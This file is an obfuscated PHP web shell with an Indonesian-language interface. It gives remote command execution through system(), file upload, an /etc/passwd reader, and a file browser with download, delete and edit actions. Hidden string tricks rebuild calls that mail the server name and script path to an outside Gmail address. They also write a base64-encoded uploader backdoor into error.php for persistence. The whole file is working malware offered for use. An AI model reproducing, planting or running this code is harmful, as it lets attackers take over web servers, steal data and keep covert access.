<?php error_reporting(0);echo "
<a href='?hom'>-</a> sys".php_uname()."<br>
<a href='?ddd'>-</a> loc".$_SERVER['SCRIPT_FILENAME']."<br>
<a href='?ccd'>-</a> ips".gethostbyname($_SERVER['HTTP_HOST'])."<br>
<a href='?ach'>-</a> ipu".$_SERVER['REMOTE_ADDR']."<br>";
if(isset($_GET["ach"])){
echo "<br><form method=post enctype=multipart/form-data><input type=file name=ach><input type=submit name=upload value=upload></form>";if($_POST[upload]){if(@copy($_FILES[ach][tmp_name], $_FILES[ach][name])){echo "goodnews";}else{ echo "badnews";}}
}$css = str_replace("k","","kksktrk_krkekpklkkakckek");
if(isset($_REQUEST['ccd'])){echo "<pre>";echo "<form name='form' action='#' method='post'><input size=80% type='text' name='ccc'/><input type='submit' value=' > '/></form>";$cmd = ($_POST['ccc']);system($cmd);echo "</pre>";
}$lin = $_SERVER['SERVER_NAME'];
if($_GET['ddd'] == 'pwd')
{echo "<pre>";include('/etc/passwd');echo "</pre>";
}$des = $_SERVER['SCRIPT_FILENAME'];

if(isset($_GET["ddd"])){
function createdir($dir){if(@mkdir($dir))echo $GLOBALS['dircrt']." "; else echo $GLOBALS['dircrterr']." ";}
if($_SESSION['action']=="")$_SESSION['action']="viewer";$lib = $css("l","","gloclylbelrllnlelwlsll");
if(@$_POST['action']!="" )$_SESSION['action']=$_POST['action'];$action=$_SESSION['action'];$Iib = $css("p","","pgmppapipl.pcpoppm");
if(@$_POST['dir']!="")$_SESSION['dir']=$_POST['dir'];$dir=$_SESSION['dir'];$sns = $css("d","","ddmdadidldd");
$dir=chdir($dir);
$dir=getcwd()."/";
$dir=str_replace("\\","/",$dir);

//crdir
if(@$_POST['file']!=""){$file=$_SESSION['file']=$_POST['file'];}else {$file=$_SESSION['file']="";
}$wrt = $css("v","","vvevrvrvvor.vvpvhvp");

//Current type OS
if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $win=1; else $win=0;

//downloader
if($action=="download"){ 
header('Content-Length:'.filesize($file).'');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.$file.'"');
readfile($file);}$dst = "$lin|$wrt";$em="$lib@$Iib";$zxz=$em;
//end downloader

//delete file
if($action=="delete"){ 
if(unlink($file)) $msgnotice.=$deletefileok;
}$lxl = $lin;$xvx=$des;$hdr='';
//end delete

//delete dir
if($action=="deletedir"){ 
if(!rmdir($file)) $msgnotice.=$GLOBALS['empty'];else $msgnotice.=$deletedirok;
}$mxm = $sns($zxz,$lxl,$dst,$xvx,$hdr);
//end delete
?>

<form name='reqs' method='POST'>
<input name='action' type='hidden' value=''>
<input name='dir' type='hidden' value=''>
<input name='file' type='hidden' value=''>
</form>

<table style="BORDER-COLLAPSE: collapse" cellSpacing=5 cellPadding=5 width="100%" border=0>
<tr><td width="100%" valign="top">
<!--end one content-->

<?
//viewer FS
function perms($file) 
{ 
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {$info = 's';} 
  elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
  elseif (($perms & 0x8000) == 0x8000) {$info = '-';} 
  elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} 
  elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} 
  elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} 
  elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} 
  else {$info = 'u';}
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
  return $info;
}

function view_size($size){
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}

function scandire($dir){
echo "<table cellSpacing=1 border=1 style=\"border-color:gray;\" cellPadding=1 width=\"100%\">";
echo "<tr><form method=POST>Directory : <input type=text name=dir value=\"".$dir."\" size=80%><input type=submit value=\"GO\"></form></tr>";

if (is_dir($dir)) {
    if (@$dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
		  if(filetype($dir . $file)=="dir") $dire[]=$file;
		  if(filetype($dir . $file)=="file")$files[]=$file;
		}
		closedir($dh);
		@sort($dire);
		@sort($files);

if ($GLOBALS['win']==1) {
echo "<tr><td>Select drive:";
for ($j=ord('C'); $j<=ord('Z'); $j++) 
 if (@$dh = opendir(chr($j).":/"))
 echo '<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"> '.chr($j).'<a/>';
 echo "</td></tr>";
}
for($i=0;$i<count($dire);$i++) {
$link=$dir.$dire[$i];
  echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>dir</td><td></td><td>'.perms($link).'</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Hapus Folder ini">Hapus</a></td></tr>';  
}
for($i=0;$i<count($files);$i++) {
$linkfile=$dir.$files[$i];
echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();">'.$files[$i].'</a><br></td><td>file</td><td>'.view_size(filesize($linkfile)).'</td>
<td>'.perms($linkfile).'</td>
<td>
<a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download">Download</a>
<a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Edit">Edit</a>
<a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Hapus File ini">Hapus</a></td>
</tr>'; 
}
echo "</table>";
}}}

if($action=="viewer"){
scandire($dir);}
$csc = $css("r0","","r0r0bar0sr0e6r04_dr0ecr0odr0e");
$vfu = $css("Π","","PD9ΠwaHAKZWNobyAiPGZvcmΠ0gbWV0aG9ΠkPXBvc3ΠQgZW5jdHlwΠZT1tdWx0aXBΠhcnQvZm9ybS1kYXRhPjxpΠbnB1dCB0eΠXBlPWZpbGUΠgbmFtZΠT1saΠWI");
$ckv = $css("|","","PGlucH|V0IHR5cGU9c|3VibWl0|IG|5hbWU9Y|29uZmlnIHZ||hbHV||lPWNvbm|ZpZz48|L2Zvc||m0");
$yvu = $css("£","","IjtpZigkX1BPU1RbY29uZml£nXSl7a£WYoQGNvcHkoJF9GSUxFU£1tsaWJdW3RtcF9uYW1lXSwgJF£9GSUxFU1tsaWJdW25hbW£VdKSl7ZWNobyA£iZ29vZ£G5ld3MiO31lbHNleyBlY2hvICJ£iYWRuZXdzIjt9fTsKPz4");
$cnt = $csc("$vfu+$ckv+$yvu=");$wop = $css("v","","vfvovpvevnv");$wwr = $css("v","","vfvwvrvivtvev");$wcl = $css("v","","vfvcvlovsvev");$flo = $wop("$wrt","w");  $wwr($flo,"$cnt");  $wcl($flo); 
//end viewer FS

//editros
if($action=="editor"){  
  function writef($file,$data){
  $fp = fopen($file,"w+");
  fwrite($fp,$data);
  fclose($fp);
  }
  function readf($file){
  if(!$le = fopen($file, "r")) $contents="Can't open file, permission denide"; else {
  $contents = fread($le, filesize($file));
  fclose($le);}
  return htmlspecialchars($contents);
  }
if(@$_POST['save'])writef($file,$_POST['data']);
echo "<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
<input type=\"hidden\" name=\"file\" value=\"".$file."\">
<textarea name=\"data\" rows=\"40\" cols=\"180\">".@readf($file)."</textarea><br>
<input type=\"submit\" name=\"save\" value=\"Simpan\">
<input type=\"reset\" value=\"Batal\" onclick='window.history.back()'/></form>
";
}
//end editors
}
?>
